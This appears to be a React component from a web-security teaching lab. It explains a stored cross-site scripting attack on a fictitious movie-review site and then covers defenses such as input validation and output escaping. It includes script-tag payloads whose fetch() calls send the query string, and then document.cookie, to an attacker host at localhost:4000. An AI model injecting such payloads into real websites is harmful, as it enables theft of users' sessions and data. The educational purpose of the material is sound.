/* eslint-disable react/no-unescaped-entities */
/* eslint-disable no-unused-vars */
import React,{useEffect,useState} from 'react';
import 'tailwindcss/tailwind.css';
import { AiOutlineSearch } from 'react-icons/ai';
import { FaHome } from 'react-icons/fa';

const MovieCenter = () => {
  
  const [, setName] = useState("");

  return (
    <div className="container mx-auto p-4">
      <p>
      The project implements a specific movie page of a fictitious movie streaming website. Users can add their review to the movie by simply filling in the text box and clicking the submit button. For simplicity, assume that users have already been authenticated, and this is just one specific step in the user's journey on the website.

When you add your review, you see it appearing in the comments section. Any other user will see your review.
      </p>
      <p>
      his website is meant to capture private data from the vulnerable website by exploiting its cross-site scripting vulnerabilities.

Let's see the attack in action.

Injecting the malicious code
Now, assume you are the attacker visiting the streaming website and, instead of adding a review to the movie, you add the following string in the review text box:
      </p>
      <p><script>fetch(`http://localhost:4000?data=${encodeURIComponent(window.location.search)}`)</script></p>
      <p>As you can see, this is a script element containing a JavaScript statement that sends an HTTP request to the attacker's website. That HTTP request is passing the current search query parameters.

Using the <script/> element is just one example of how you can inject your JavaScript code. You can perform code injection using various HTML tags. Be aware, also, that other XSS injection techniques involve CSS, direct JavaScript code, etc.

After submitting this string, you will get the following result in the page of the vulnerable website:</p>
     
     <p>At the bottom of the page, you find an empty comment. This may seem harmless, however, if you reload the attacker's website, you will see that it grabbed your current query string:</p>
     <p>The actual attack
The actual attack happens when another user accesses that page of the vulnerable website. So, to simulate a different user, open another tab of your browser in incognito mode or an instance of a different browser. Then navigate to the vulnerable website and add a new review on the movie.

You will notice that nothing strange happens on the vulnerable website. Your review is appended right below the empty one. However, try to reload the attacker's website. You will see your new review below the previous one:

</p> 

<p>Your review has been captured by the attacker without you even realizing it.

You may think that capturing reviews is not so interesting, since the review is public anyway. But consider what may happen if you, as the attacker, drop the following code snippet as your review on the movie:

<script>fetch(`http://localhost:4000?data=${document.cookie}`)</script></p>
<p>If the vulnerable website developer has taken no precautions to secure the cookies, you will capture the current user's cookies. That means you are capturing users' sessions and can access the vulnerable website by impersonating them. Also, your browser storage is at risk. So, if you are storing your access token in the browser, you are giving the attacker the opportunity to access your resources on your behalf.

Now do you think it is dangerous enough?

"Being aware of XSS vulnerabilities in web applications and knowing how to prevent attacks is a must for any developer."</p>
      
      <div className=' bg-white shadow-md rounded-md p-6' style={{ width: '1100px', overflow: 'hidden' }}>
        <iframe
          src="http://localhost:3000"
          title="External Content"
          width="100%"
          height="1200px"
          style={{ overflow: 'hidden' }}
        ></iframe>
      </div>
    
      <div className='mt-4 bg-white shadow-md rounded-md p-6' style={{ width: '1100px', overflow: 'hidden' }}>
        <iframe
          src="http://localhost:4000"
          title="External Content"
          width="100%"
          height="600px"
          style={{ overflow: 'hidden' }}
        ></iframe>
      </div>

 <p>
        XSS Defense: Working on Untrusted data
Now you have a clearer understanding of how Cross-Site Scripting attacks work. So, the next step is learning how to protect your application from them. You may have been realizing that the main reason for having an XSS vulnerability is the lack of data validation. So, you guessed that the primary defense against XSS attacks is distrusting user input. You have two main strategies:

Validate user input: You must make sure that all the data entered by the user is as you expect it to be. Use validation functions, regular expressions, and whatever prevents the user from sending you data in an unexpected format. Sanitize user input or reject it. Also, make sure to validate user input both on the client and on the server side.

Escape untrusted output: As you learned, showing data to the user is the primary means to execute the injected malicious code. Even if you validated the user input, don't trust it too much. Combine input validation with output escaping so that it can't be interpreted as code.
      </p>
      <div className="flex justify-center mt-4">
        <button
          type="button"
          className=" bg-gradient-to-r from-sky-500 to-blue-600 hover:scale-105 hover:shadow-white text-white font-mono py-2 px-4 rounded-full inline-flex items-center hover:shadow-lg focus:ring-2 focus:ring-blue-500"
          onClick={() => (window.location.href = '/')}
        >
          <FaHome className="mr-2" />
          Home
        </button>

        {/* Divider */}
        <div className="mx-4 border-l border-gray-100"></div>

        <button
          type="button"
          className="bg-gradient-to-r from-cyan-500 to-green-600 text-white hover:scale-105 hover:shadow-white py-2 px-4 rounded-full inline-flex items-center hover:shadow-md focus:ring-2 focus:ring-green-500"
          onClick={() => (window.location.href = '/learn')}
        >
          <AiOutlineSearch className="mr-2" />
          Labs
        </button>
        
      </div>
     
    </div>
  );
};


export default MovieCenter;
